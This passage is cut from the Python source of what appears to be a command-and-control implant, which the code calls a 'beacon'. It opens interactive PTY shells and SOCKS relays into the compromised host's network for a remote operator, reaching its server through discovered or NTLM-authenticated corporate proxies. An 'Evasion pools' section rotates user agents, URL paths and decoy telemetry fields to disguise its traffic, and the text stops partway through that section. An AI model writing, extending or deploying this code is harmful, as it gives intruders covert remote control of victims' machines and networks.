                _shut_socket(sock)

    def _serve_relay(self, sock: socket.socket, noise: NoiseSession) -> None:
        """Read the one SOCKS request this relay carries, and answer it.

        No `_bytes_waiting` peek here, unlike the command loop: at this
        point in the protocol the operator's end owes exactly one request,
        so an orderly FIN and a truncated frame mean the same thing -- the
        session is over before it began -- and both end this relay. The
        distinction is only worth making where it changes what is done.
        """
        sock.settimeout(self.connect_timeout)
        # A ValueError from either call is a frame that did not
        # authenticate or a request that was not one; the caller closes
        # the connection over it, which is Noise §5.1 where the policy
        # was deferred to.
        cmd, atyp, address, port = decode_socks_request(
            noise.decrypt(read_frame(sock)))
        # The request's own address type is not acted on: the codec is the
        # authority on it and refuses one it does not know, and the type
        # in the reply is the family of the socket actually opened, which
        # is not always the family that was asked for -- a name can
        # resolve to either.
        target = "%s:%d" % (address, port)
        logger.debug("tunnel: a relay asked for %s to %s (%s)",
                     SOCKS_COMMAND_NAMES.get(cmd, cmd), target,
                     SOCKS_ADDRESS_TYPE_NAMES.get(atyp, atyp))
        if not socks_command_supported(cmd):
            # BIND and UDP ASSOCIATE decode so that they can be refused
            # properly: at the operator's end a parse error is
            # indistinguishable from a dead tunnel.
            logger.info("tunnel: the operator asked for %s to %s, which an "
                        "endpoint does not serve",
                        SOCKS_COMMAND_NAMES.get(cmd, cmd), target)
            self._reply(sock, noise, REPLY_COMMAND_NOT_SUPPORTED)
            return
        try:
            peer = self._dial_target(address, port, self.connect_timeout)
        except (OSError, ValueError) as exc:
            reply = _socks_reply_for_error(exc)
            logger.info("tunnel: could not reach %s (%s); answering %s",
                        target, exc, SOCKS_REPLY_NAMES.get(reply, reply))
            self._reply(sock, noise, reply)
            return
        self._register_socket(peer)
        try:
            atyp_out, bound, bound_port = _bound_socks_address(peer)
            # The reply is a frame of its own and carries nothing else.
            # The operator's end reads it with one `recv_message` and
            # refuses a frame that is not exactly a reply, so a target
            # that speaks first -- and most do -- must not have its first
            # bytes coalesced into this one.
            self._reply(sock, noise, REPLY_SUCCEEDED, atyp_out, bound,
                        bound_port)
            self._count_session(1)
            try:
                logger.info("tunnel: carrying %s", target)
                self._bridge(sock, noise, peer)
            finally:
                self._count_session(-1)
        finally:
            self._forget_socket(peer)
            _shut_socket(peer)

    def _reply(self, sock: socket.socket, noise: NoiseSession, reply: int,
               atyp: int = ATYP_IPV4, address: str = "0.0.0.0",
               port: int = 0) -> None:
        """One SOCKS reply, as its own frame."""
        write_frame(sock,
                    noise.encrypt(encode_socks_reply(reply, atyp, address,
                                                     port)))

    def _dial_target(self, address: str, port: int,
                     timeout: float) -> socket.socket:
        """One TCP connection into the network this endpoint sits in.

        The single place this class touches the target network, which is
        also what makes it the one seam a test can stand in for a
        condition a host cannot be made to produce on demand.
        `create_connection` resolves a name and tries every address it is
        given, which is what makes `ATYP=3` work and what reaches an IPv6
        target wherever the host has a route to one.
        """
        return socket.create_connection((address, port), timeout=timeout)

    def _bridge(self, relay: socket.socket, noise: NoiseSession,
                peer: socket.socket) -> None:
        """Carry bytes until either side is finished.

        Neither descriptor has a timeout here. An idle session is an
        ordinary thing -- a target that speaks first, an operator's shell
        waiting on a prompt -- and `stop` unparks both directions by
        shutting their descriptors down instead.

        Each socket has exactly one writer, which is why neither direction
        needs the lock the command channel has. This thread wrote the
        reply and then carries the target's bytes to the relay, so it is
        the only writer on the relay socket; the thread started here is
        the only writer on the target socket. No reply is ever sent after
        this point, which is what makes that hold.
        """
        relay.settimeout(None)
        peer.settimeout(None)
        back = threading.Thread(target=self._to_target,
                                args=(relay, noise, peer),
                                name="tunnel-relay-in", daemon=True)
        try:
            back.start()
        except RuntimeError as exc:
            # A one-way proxy is worse than none, so the session ends
            # here: the caller closes both sockets and the operator sees
            # the stream go.
            logger.warning("tunnel: could not start the return direction of "
                           "a relay; closing it: %s", exc)
            return
        try:
            self._to_relay(relay, noise, peer)
        finally:
            # Both descriptors before the join: the other thread may be
            # parked in a read or in a send that TCP backpressure has
            # stopped, and neither wakes on its own.
            _shutdown_socket(relay)
            _shutdown_socket(peer)
            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)

    def _to_relay(self, relay: socket.socket, noise: NoiseSession,
                  peer: socket.socket) -> None:
        """The target's bytes, toward the operator."""
        while True:
            try:
                data = peer.recv(_TUNNEL_CHUNK)
            except OSError:
                return
            if not data:
                # The target is finished, so the session is: whichever
                # direction ends first ends it, because a SOCKS proxy that
                # kept half of one open would leave the operator's tool
                # waiting on a target that has gone.
                return
            try:
                write_frame(relay, noise.encrypt(data))
            except (OSError, ValueError):
                return

    def _to_target(self, relay: socket.socket, noise: NoiseSession,
                   peer: socket.socket) -> None:
        """The operator's bytes, toward the target."""
        try:
            self._to_target_loop(relay, noise, peer)
        finally:
            # This direction ending ends the session, as the other one
            # does: the operator's port closes both of its directions
            # together, so a half-open relay here would carry nothing and
            # would hold a thread until the target happened to close.
            _shutdown_socket(relay)
            _shutdown_socket(peer)

    def _to_target_loop(self, relay: socket.socket, noise: NoiseSession,
                        peer: socket.socket) -> None:
        while True:
            try:
                if not _bytes_waiting(relay):
                    # A FIN between frames: the operator's end is done.
                    # The peek is what keeps that ordinary teardown out of
                    # the warning below, since `read_frame` reports it
                    # with the same exception as a truncated frame.
                    return
                frame = read_frame(relay)
            except OSError:
                return
            except ValueError as exc:
                logger.warning("tunnel: a relay frame was malformed (%s); "
                               "the session is over", exc)
                return
            try:
                data = noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1 again, on the relay this time.
                logger.warning("tunnel: a relay frame did not authenticate "
                               "(%s); the session is over", exc)
                return
            try:
                peer.sendall(data)
            except OSError:
                return

    # ── a PTY session ──

    def _spawn_shell(self, body: dict) -> None:
        """Dial the shell session the server has just asked for, on a thread.

        A sibling of `_spawn_relay`, and the same two rules: the port in
        the message is read, logged when it differs and never acted on,
        for the reason that method's docstring gives at length; and a
        thread the process cannot give is a degraded session rather than
        an exception, because the operator's end is already waiting on a
        session that will now simply never pair.

        What is *not* here is the session cap. It is applied in
        `_serve_shell`, after the dial and the claim, because a refusal
        has to arrive as text on the stream the operator is watching: an
        attach refused before its stream existed looks exactly like a
        tunnel that has stopped working, which is the one diagnosis this
        feature must not hand anybody.
        """
        token = body.get("token")
        advertised = body.get("port")
        if not isinstance(token, str) or not token:
            logger.warning("tunnel: an OPEN_SHELL carrying no token; ignored")
            return
        if advertised != self.port:
            logger.debug("tunnel: an OPEN_SHELL advertised port %r; this "
                         "endpoint dials its configured %d",
                         advertised, self.port)
        cols = _shell_geometry(body.get("cols"), SHELL_DEFAULT_COLS)
        rows = _shell_geometry(body.get("rows"), SHELL_DEFAULT_ROWS)
        thread = threading.Thread(target=self._shell, args=(token, cols, rows),
                                  name="tunnel-shell", daemon=True)
        with self._lock:
            self._relay_threads = [t for t in self._relay_threads
                                   if t.is_alive()]
            self._relay_threads.append(thread)
        try:
            thread.start()
        except RuntimeError as exc:
            with self._lock:
                if thread in self._relay_threads:
                    self._relay_threads.remove(thread)
            logger.warning("tunnel: no thread could be started for a shell "
                           "session: %s", exc)

    def _shell(self, token: str, cols: int, rows: int) -> None:
        """One shell session: dial the same port, claim it, serve it."""
        sock = None
        try:
            sock = self._dial(self.port)
            self._register_socket(sock)
            noise = self._handshake(
                sock, encode_message(MSG_SHELL, {"token": token}))
            self._serve_shell(sock, noise, cols, rows)
        except (OSError, ValueError) as exc:
            # As in `_relay`: a session that could not be dialled, a token
            # the server no longer holds, a frame that did not
            # authenticate, an operator who closed their terminal. All of
            # it costs this one session and is logged, and never the
            # endpoint.
            logger.info("tunnel: a shell session to %s:%d ended: %s",
                        self.server, self.port, exc)
        except Exception:
            logger.exception("tunnel: unexpected error on a shell session")
        finally:
            if sock is not None:
                self._forget_socket(sock)
                _shut_socket(sock)

    def _serve_shell(self, sock: socket.socket, noise: NoiseSession,
                     cols: int, rows: int) -> None:
        """Open a PTY, start a shell on it, and carry it until it ends.

        Where `_serve_relay` reads a SOCKS request and answers it, this
        reads nothing: after the claim the stream is already the
        terminal's, and the operator's first byte is input for the shell.
        The two refusals that remain are written as plain text for the
        same reason -- a terminal is what is reading them.

        The child is started so that it leads a session of its own and
        owns the terminal: through `setsid -c` where the host has it, and
        otherwise with `start_new_session=True` and no controlling
        terminal, which `_SETSID_PATHS` sets out at length. Either way the
        pid is the group id, which is what the teardown signals: what an
        operator leaves behind is as likely to be a `tcpdump` they started
        as the shell itself.

        The slave is closed here the moment the child holds its own copy,
        because the master reports the child's exit -- `EIO`, or an empty
        read -- only once nothing else has the slave open; a parent that
        kept it would park the output pump for ever on a shell that had
        already gone.

        Everything is undone in the `finally`, including on a thread that
        could not be started: no child process and no descriptor may
        outlive this method.
        """
        try:
            pty_mod, fcntl_mod, termios_mod, select_mod, signal_mod = (
                _shell_modules())
        except ImportError as exc:
            self._refuse_shell(
                sock, noise,
                "this host cannot open a terminal session (%s). A shell "
                "session needs a POSIX pty, which this build's host does "
                "not have." % exc)
            return
        if not self._take_shell_slot():
            self._refuse_shell(
                sock, noise,
                "this endpoint already carries %d shell sessions, which is "
                "all it will hold at once. Close one and attach again."
                % _SHELL_MAX_SESSIONS)
            return
        master = None
        slave = None
        child_fds = ()
        child = None
        try:
            master, slave = pty_mod.openpty()
            # Non-blocking from here on, in both directions. Either call
            # on a master can block for as long as the child chooses --
            # see `_write_all` for the input queue, which is the one that
            # bites -- and both pumps wait in `select` instead, where the
            # end of the session is visible.
            os.set_blocking(master, False)
            with self._lock:
                reported = self._reported_history
            try:
                argv, env, child_fds = _shell_invocation(cols, rows, reported)
            except _HistoryGuardChanged as exc:
                # The guard was reported once, at connect, and this host
                # has since answered differently. Refused rather than
                # served: a panel is showing the reported answer to an
                # operator, and a session that quietly contradicts it is
                # the whole reason that answer is reported at all.
                # In the page's words: `weak` is the code's, and the
                # operator has only ever been shown "not guaranteed off".
                said = {"off": "off", "weak": "not guaranteed off"}
                was, why_was = exc.reported
                now, why_now = exc.now
                self._refuse_shell(
                    sock, noise,
                    "no session was started, because what a session here "
                    "would do about command history has changed since the "
                    "tunnel connected, and what the interface shows about "
                    "it is out of date. It was told history is %s%s; a "
                    "session now would have history %s%s. The answer is "
                    "reported again only when the tunnel itself "
                    "reconnects: in the tunnel panel, Stop this endpoint "
                    "and, once it shows stopped, Start it, one check-in "
                    "each; stopping it ends every session and proxy on "
                    "this endpoint, not just this one. Closing this view "
                    "and opening another shell "
                    "does not do it, because a shell rides the channel "
                    "that is already up."
                    % (said.get(was, was),
                       " (%s)" % why_was if why_was else "",
                       said.get(now, now),
                       " (%s)" % why_now if why_now else ""))
                return
            except _HistoryPipeError as exc:
                # Only this one: see `_shell_invocation`. Any other
                # `OSError` from there takes the generic refusal below.
                # This one names history, because "could not start"
                # would leave the operator to guess what was being
                # protected.
                if exc.errno in (errno.EMFILE, errno.ENFILE):
                    advice = ("The host is out of file descriptors; "
                              "attach again once some are free.")
                else:
                    advice = "Attach again."
                self._refuse_shell(
                    sock, noise,
                    "no session was started, because the pipe that keeps "
                    "its command history off could not be set up (%s) "
                    "and a session without it could record what you "
                    "type. %s" % (exc, advice))
                return
            program = argv[0]
            leader = _setsid_program()
            if leader:
                argv = [leader, "-c"] + argv
            else:
                logger.info(
                    "tunnel: no setsid on this host, so a shell session's "
                    "terminal is not its controlling terminal: job control "
                    "is off and ^C reaches readline rather than the "
                    "running command")
            child = subprocess.Popen(argv, stdin=slave, stdout=slave,
                                     stderr=slave, cwd=_SHELL_CWD, env=env,
                                     start_new_session=not leader,
                                     pass_fds=child_fds)
            _close_fd(slave)
            slave = None
            for fd in child_fds:
                _close_fd(fd)
            child_fds = ()
            fcntl_mod.ioctl(master, termios_mod.TIOCSWINSZ,
                            struct.pack("HHHH", rows, cols, 0, 0))
        except (OSError, ValueError) as exc:
            # A host out of descriptors or ptys, or a shell that is not
            # where every POSIX host keeps one.
            self._refuse_shell(sock, noise,
                               "this host could not start a terminal "
                               "session (%s)." % exc)
        else:
            logger.info("tunnel: a shell session opened: %s, %dx%d, pid %d",
                        program, cols, rows, child.pid)
            self._count_session(1)
            try:
                self._shell_bridge(sock, noise, master, select_mod)
            finally:
                self._count_session(-1)
        finally:
            for fd in child_fds:
                _close_fd(fd)
            if slave is not None:
                _close_fd(slave)
            if child is not None:
                self._end_shell(child, signal_mod)
            if master is not None:
                _close_fd(master)
            self._drop_shell_slot()

    def _shell_bridge(self, sock: socket.socket, noise: NoiseSession,
                      master: int, select_mod) -> None:
        """Carry bytes until either the stream or the shell is finished.

        `_bridge`'s shape with the target socket replaced by the PTY
        master, and its invariant too: exactly one thread writes each
        descriptor, so neither direction needs the lock the command
        channel has. This thread is the only writer on the master; the
        thread started here is the only writer on the stream.

        The stream has no timeout, as in a relay -- an idle session is an
        ordinary thing, which is most of what a shell session is. The
        master cannot be unparked by a shutdown the way a socket can, so
        the two directions share an event instead: whichever finishes
        first sets it, and the other sees it within `_SHELL_POLL`. That is
        what keeps either pump from sitting in a call on the master while
        the session is over -- which would end with a join that timed out
        and a caller closing a master another thread is still parked in,
        the one way a descriptor number gets reused underneath somebody.
        """
        sock.settimeout(None)
        ended = threading.Event()
        back = threading.Thread(target=self._from_pty,
                                args=(sock, noise, master, ended, select_mod),
                                name="tunnel-shell-out", daemon=True)
        try:
            back.start()
        except RuntimeError as exc:
            # A session an operator can type into and see nothing from is
            # worse than none, so it ends here: the caller reaps the child
            # and closes the master, and the stream goes with it.
            logger.warning("tunnel: could not start the output direction of "
                           "a shell session; closing it: %s", exc)
            return
        try:
            self._to_pty(sock, noise, master, ended, select_mod)
        finally:
            # The event before the join, for the master, and the shutdown
            # for the stream: the other thread may be parked in either.
            ended.set()
            _shutdown_socket(sock)
            back.join(timeout=_TUNNEL_JOIN_TIMEOUT)

    def _from_pty(self, sock: socket.socket, noise: NoiseSession, master: int,
                  ended: threading.Event, select_mod) -> None:
        """The shell's output, toward the operator."""
        try:
            while not ended.is_set() and not self._stop.is_set():
                try:
                    readable = select_mod.select([master], [], [],
                                                 _SHELL_POLL)[0]
                except OSError:
                    return
                if not readable:
                    continue
                try:
                    data = os.read(master, _TUNNEL_CHUNK)
                except BlockingIOError:
                    # Readiness is not a reservation, and the master is
                    # non-blocking: another pass.
                    continue
                except OSError as exc:
                    # `EIO` on a master is the child having gone: that is
                    # how a slave with no process left on it reads on
                    # Linux, where elsewhere it is an empty read. Both
                    # end the session.
                    if exc.errno != errno.EIO:
                        logger.debug("tunnel: a shell session's terminal "
                                     "ended: %s", exc)
                    return
                if not data:
                    return
                try:
                    write_frame(sock, noise.encrypt(data))
                except (OSError, ValueError):
                    return
        finally:
            # This direction ending ends the session, as in a relay: a
            # shell the operator can no longer see is not a session.
            ended.set()
            _shutdown_socket(sock)

    def _to_pty(self, sock: socket.socket, noise: NoiseSession, master: int,
                ended: threading.Event, select_mod) -> None:
        """The operator's keystrokes, toward the shell."""
        try:
            self._to_pty_loop(sock, noise, master, ended, select_mod)
        finally:
            ended.set()
            _shutdown_socket(sock)

    def _to_pty_loop(self, sock: socket.socket, noise: NoiseSession,
                     master: int, ended: threading.Event, select_mod) -> None:
        def live():
            """Whether this session is still worth a byte on the master.

            The flags, and the stream. While this thread is inside the
            write loop it is not the one reading the socket, and the
            other direction only touches it when the shell produces
            output -- which a session blocked on a silent command does
            not. So an operator who has gone is visible here and nowhere
            else, and `_bytes_waiting`'s peek is how: readable with
            nothing behind it is a FIN.
            """
            if ended.is_set() or self._stop.is_set():
                return False
            try:
                if not select_mod.select([sock], [], [], 0)[0]:
                    return True
                return _bytes_waiting(sock)
            except OSError:
                return False

        while live():
            try:
                if not _bytes_waiting(sock):
                    # A FIN between frames: the operator's terminal is
                    # gone. The peek is what keeps that ordinary ending
                    # out of the warning below, exactly as in a relay.
                    return
                frame = read_frame(sock)
            except OSError:
                return
            except ValueError as exc:
                logger.warning("tunnel: a shell frame was malformed (%s); "
                               "the session is over", exc)
                return
            try:
                data = noise.decrypt(frame)
            except ValueError as exc:
                # Noise §5.1, on a shell session this time.
                logger.warning("tunnel: a shell frame did not authenticate "
                               "(%s); the session is over", exc)
                return
            try:
                if not _write_all(master, data, live, select_mod):
                    return
            except OSError:
                return

    def _refuse_shell(self, sock: socket.socket, noise: NoiseSession,
                      reason: str) -> None:
        """One line of readable text on the stream, and nothing else.

        Text and not a message kind: what is at the other end of this
        stream is the operator's terminal, so a sentence is the only
        refusal they can read -- and a terminal in raw mode needs the
        carriage return. Every refusal says what happened and what to do
        about it; none of them is a stack trace.
        """
        logger.info("tunnel: refusing a shell session: %s", reason)
        try:
            write_frame(sock,
                        noise.encrypt(("raccoon: %s\r\n" % reason)
                                      .encode("utf-8")))
        except (OSError, ValueError) as exc:
            logger.debug("tunnel: the refusal could not be written: %s", exc)

    def _end_shell(self, child: "subprocess.Popen", signal_mod) -> None:
        """Hang the session up, kill what is left of it, and reap it.

        The process group and not the process: the child leads a session
        of its own on both of `_serve_shell`'s paths -- `setsid(1)`
        `exec`s in place rather than forking, so once it has run, the pid
        `Popen` returned is the session leader and the group id on either
        path -- and an operator's `tcpdump` is in that group too.
        `SIGHUP` first, because losing a terminal is what a hangup is and
        an interactive shell exits on it after hanging up its own jobs;
        `SIGKILL` after `_SHELL_TERM_GRACE`, because a session whose
        stream has gone has nothing left to negotiate with.

        "Once it has run" is a real window: between `Popen` returning and
        the wrapper reaching `setsid()`, the pid leads no group and
        `killpg` answers `ESRCH`, which `_signal_shell` logs and swallows.
        It is survivable rather than guarded against, because the session
        cannot have carried a byte that early and because closing the
        master below hangs up the terminal on exactly the path that has
        one. The reap then collects the child whichever signal ended it.

        Reaped before returning -- `Popen.wait` is `waitpid` -- because a
        zombie root shell in the beacon's process table is the same
        finding as a live one to anybody reading `ps`, and nothing can
        clear it remotely afterwards.
        """
        pid = child.pid
        if child.poll() is None:
            self._signal_shell(pid, signal_mod.SIGHUP)
            try:
                child.wait(timeout=_SHELL_TERM_GRACE)
            except subprocess.TimeoutExpired:
                logger.info("tunnel: a shell session's process group %d did "
                            "not go on SIGHUP; killing it", pid)
                self._signal_shell(pid, signal_mod.SIGKILL)
        try:
            child.wait(timeout=_SHELL_TERM_GRACE)
        except subprocess.TimeoutExpired:
            # A process in an uninterruptible syscall, which not even
            # SIGKILL moves until it returns. Said out loud rather than
            # waited on: this thread is not the place to block for ever.
            logger.warning("tunnel: a shell session's child %d could not be "
                           "reaped after SIGKILL", pid)
            return
        logger.info("tunnel: a shell session ended, child %d exit %s",
                    pid, child.returncode)

    @staticmethod
    def _signal_shell(pid: int, number: int) -> None:
        """One signal to the group `pid` leads, raising nothing.

        Safe to call twice and safe on a group that has already gone:
        the child is not reaped until `_end_shell` does it, so this pid
        cannot have been reused by somebody else in between.
        """
        try:
            os.killpg(pid, number)
        except OSError as exc:
            logger.debug("tunnel: could not signal the shell's group %d: %s",
                         pid, exc)

    def _take_shell_slot(self) -> bool:
        """Reserve one of the `_SHELL_MAX_SESSIONS` slots, or refuse."""
        with self._lock:
            if self._shells >= _SHELL_MAX_SESSIONS:
                return False
            self._shells += 1
            return True

    def _drop_shell_slot(self) -> None:
        with self._lock:
            self._shells -= 1

    # ── getting out ──

    def _dial(self, port: int) -> socket.socket:
        """One TCP stream to `self.server:port`, by the first way out.

        A configured proxy, then whatever `ProxyDiscovery` finds, then
        direct. The way that worked last is tried first, so a relay does
        not re-walk the list; when that fails the whole list is walked
        again, because what broke may be the proxy rather than the tunnel.
        """
        attempts = []
        for route in self._routes():
            try:
                return self._dial_route(route, port)
            except OSError as exc:
                attempts.append("%s: %s" % (_route_name(route), exc))
        raise OSError("no way out to %s:%d -- %s"
                      % (self.server, port, "; ".join(attempts)))

    def _routes(self) -> list:
        """The ways out, in the order they are tried. `None` is direct."""
        ordered = []
        with self._lock:
            if self._route_known:
                ordered.append(self._route)
        if self.proxy_mode != "none":
            for route in self._configured_routes() + self._discovered_routes():
                if route not in ordered:
                    ordered.append(route)
        if None not in ordered:
            # Direct is always last and always tried: a proxy that has
            # stopped answering must not take the tunnel with it.
            ordered.append(None)
        return ordered

    def _configured_routes(self) -> list:
        """The proxy this build was told to use, if it was told one."""
        routes = []
        relay = self._ntlm_route()
        if relay is not None:
            routes.append(relay)
        endpoint = _proxy_endpoint(self.proxy_url)
        if endpoint is not None:
            routes.append(endpoint)
        return routes

    def _ntlm_route(self) -> Optional[Tuple[str, int]]:
        """The local NTLM relay's address, starting it if it is configured.

        `_NtlmProxyRelay` is a CONNECT proxy on loopback that performs the
        NTLM handshake against the corporate one, so what this class does
        with it is what it does with any proxy: dial it and write a
        CONNECT. That indirection exists because the NTLM exchange has to
        happen on the same TCP connection as the CONNECT it authorises,
        which is not something a caller of this class could arrange.
        """
        cfg = self._proxy_ntlm
        if not cfg.get("enabled"):
            return None
        with self._lock:
            started = self._ntlm_relay
        if started is not None:
            return "127.0.0.1", started.port
        host = str(cfg.get("host") or "").strip()
        username = cfg.get("username") or ""
        password = cfg.get("password") or ""
        if not host or not username or not password:
            logger.warning("tunnel: proxy NTLM is enabled but its host or "
                           "credentials are missing; skipping the relay")
            return None
        try:
            relay = _NtlmProxyRelay(
                host, int(cfg.get("port") or 8080), username, password,
                domain=cfg.get("domain", ""),
                workstation=cfg.get("workstation", ""))
            relay.start()
        except (OSError, RuntimeError) as exc:
            # A local port it could not bind, or no thread to serve it
            # with. Either way the other ways out are still there.
            logger.warning("tunnel: the NTLM proxy relay would not start "
                           "(%s); falling back", exc)
            return None
        with self._lock:
            if self._stop.is_set():
                # `stop` ran while this relay was binding its port, and
                # took `_ntlm_relay` with it. Installing it now would
                # leave a bound loopback port and an accept thread that
                # nothing is left to stop.
                installed = None
            elif self._ntlm_relay is None:
                self._ntlm_relay = relay
                installed = relay
            else:
                # Another thread won the race; one local port is enough.
                installed = self._ntlm_relay
        if installed is not relay:
            relay.stop()
        if installed is None:
            return None
        return "127.0.0.1", installed.port

    def _discovered_routes(self) -> list:
        """What `ProxyDiscovery` finds, run once per endpoint and cached.

        Once, because discovery shells out, reads the registry and makes
        two DNS lookups for WPAD, and a relay that re-ran all of that per
        session would be slow and loud in equal measure. PAC and WPAD
        entries are skipped: their URL is a script to fetch and evaluate,
        not a proxy a CONNECT can be written to.
        """
        with self._lock:
            cached = self._discovered
        if cached is not None:
            return cached
        routes = []
        try:
            for proxy in ProxyDiscovery().discover_all():
                if proxy.get("is_pac"):
                    continue
                endpoint = _proxy_endpoint(proxy.get("url"))
                if endpoint is not None and endpoint not in routes:
                    routes.append(endpoint)
        except Exception as exc:
            # Discovery runs `gsettings`, reads the Windows registry and
            # resolves names. A host where one of those misbehaves still
            # has a direct route to try.
            logger.debug("tunnel: proxy discovery failed: %s", exc)
        with self._lock:
            self._discovered = routes
        return routes

    def _dial_route(self, route: Optional[Tuple[str, int]],
                    port: int) -> socket.socket:
        """One TCP stream by one way out, remembered if it works."""
        if route is None:
            sock = socket.create_connection((self.server, port),
                                            timeout=self.connect_timeout)
        else:
            sock = socket.create_connection(route,
                                            timeout=self.connect_timeout)
            try:
                self._write_connect(sock, port)
            except OSError:
                _shut_socket(sock)
                raise
        with self._lock:
            self._route, self._route_known = route, True
        return sock

    def _write_connect(self, sock: socket.socket, port: int) -> None:
        """`CONNECT <server>:<port>`, and the proxy's answer to it.

        Written here rather than left to urllib because what follows on
        this socket is Noise and not HTTP: urllib would own the stream.
        The target is the tunnel server's single port, which is the whole
        reason there is only one of them -- a second, unpredictable
        destination port is what a default Squid configuration refuses.
        """
        target = "%s:%d" % (self.server, port)
        sock.settimeout(self.connect_timeout)
        sock.sendall(("CONNECT %s HTTP/1.1\r\nHost: %s\r\n"
                      "Proxy-Connection: Keep-Alive\r\n\r\n"
                      % (target, target)).encode("ascii"))
        status = _proxy_read_line(sock)
        for _ in range(_PROXY_MAX_HEADERS):
            if not _proxy_read_line(sock):
                break
        fields = status.split(" ")
        if len(fields) < 2 or fields[1] != "200":
            # 407 lands here as well as 403: this class has no credentials
            # of its own to offer, and the NTLM relay above is the path
            # for a proxy that wants some.
            raise OSError("the proxy answered %r to CONNECT %s"
                          % (status, target))

    # ── bookkeeping ──

    def _handshake(self, sock: socket.socket, payload: bytes) -> NoiseSession:
        """The initiator's two messages, with `payload` inside the first."""
        sock.settimeout(self.connect_timeout)
        noise = NoiseSession.initiator(self._public, self._psk)
        write_frame(sock, noise.initiate(payload))
        noise.complete(read_frame(sock))
        return noise

    def _egress(self) -> Optional[str]:
        with self._lock:
            if not self._route_known:
                return None
            return _route_name(self._route)

    @staticmethod
    def _crypto_path() -> str:
        """Which AES backend this process has: `openssl` or `pure-python`.

        Read through the module rather than copied at construction, so a
        test that forces the slow backend sees it here too.
        """
        return "pure-python" if _USE_PURE_PYTHON_AES else "openssl"

    def _register_socket(self, sock: socket.socket) -> None:
        with self._lock:
            self._relay_sockets.add(sock)

    def _forget_socket(self, sock: socket.socket) -> None:
        with self._lock:
            self._relay_sockets.discard(sock)

    def _count_session(self, delta: int) -> None:
        with self._lock:
            self._sessions += delta
            if delta > 0:
                self._carried += delta


# ── Evasion pools ──

_USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux aarch64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
]

_URL_SUFFIXES = [
    "/collect", "/submit", "/sync", "/push", "/update",
    "/report", "/log", "/track", "/event", "/data",
    "/ping", "/health", "/status", "/check", "/query",
]

_ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-FR,fr;q=0.9,en-US;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
]

_EXTRA_HEADERS = {
    "Sec-Ch-Ua-Platform": ['"Linux"', '"Windows"', '"macOS"'],
    "Sec-Fetch-Dest": ["empty", "document"],
    "Sec-Fetch-Mode": ["cors", "navigate", "no-cors"],
    "Sec-Fetch-Site": ["same-origin", "cross-site"],
    "Cache-Control": ["no-cache", "max-age=0", "no-store"],
    "Pragma": ["no-cache"],
    "DNT": ["1"],
    "X-Requested-With": ["XMLHttpRequest"],
}

# The shortest check-in this beacon will honour. It has existed since the
# initial commit as a bare `max(10, delay)` inside `_jittered_sleep`, and
# the number was applied to the sleep while the configured value went on
# being reported. The server sizes its freshness windows from that report
# -- `online` under `interval * 2`, `stale` under `interval * 5` -- so an
# interval of 2 meant a 4-second online window against a real 10.1-second
# period, and a perfectly healthy beacon flapped between online and
# offline on every single cycle. Measured in the local environment: four
# agents, "Agent Offline" then "Agent Back Online", for ever.
#
# Raising the value instead of hiding it keeps one number true everywhere:
# what the beacon reports is what it waits.
_MIN_INTERVAL = 10


def _clamp_interval(value) -> float:
    """The interval this beacon will actually honour, from what was asked.

    A value below the floor is raised rather than kept, because the number
    held here is the one reported in every check-in.
    """
    try:
        asked = float(value)
    except (TypeError, ValueError):
        return 300.0
    return asked if asked >= _MIN_INTERVAL else float(_MIN_INTERVAL)


_PAYLOAD_FIELDS = [
    "session_token", "auth_hash", "state_key", "nonce", "validation",
    "api_key", "request_token", "cipher_text", "payload_data", "signature",
    "trace_id", "correlation_id", "request_id", "transaction_id",
]


def _decoy_fields(n: int) -> dict:
    """Generate n random telemetry-like decoy fields."""
    pool = {
        "cpu_pct": lambda: round(random.uniform(2, 90), 1),
        "mem_mb": lambda: random.randint(64, 8192),
        "disk_pct": lambda: round(random.uniform(10, 95), 1),
        "request_count": lambda: random.randint(100, 99999),
        "session_count": lambda: random.randint(1, 5000),
        "error_rate": lambda: round(random.uniform(0, 5), 2),
        "latency_ms": lambda: random.randint(1, 500),
        "uptime_hrs": lambda: round(random.uniform(0.1, 720), 1),
        "queue_depth": lambda: random.randint(0, 1000),
        "cache_hit_pct": lambda: round(random.uniform(50, 99.9), 1),
        "gc_pause_ms": lambda: round(random.uniform(0.1, 50), 2),
        "thread_count": lambda: random.randint(4, 128),
        "conn_pool_active": lambda: random.randint(1, 50),
        "batch_size": lambda: random.randint(10, 500),
    }
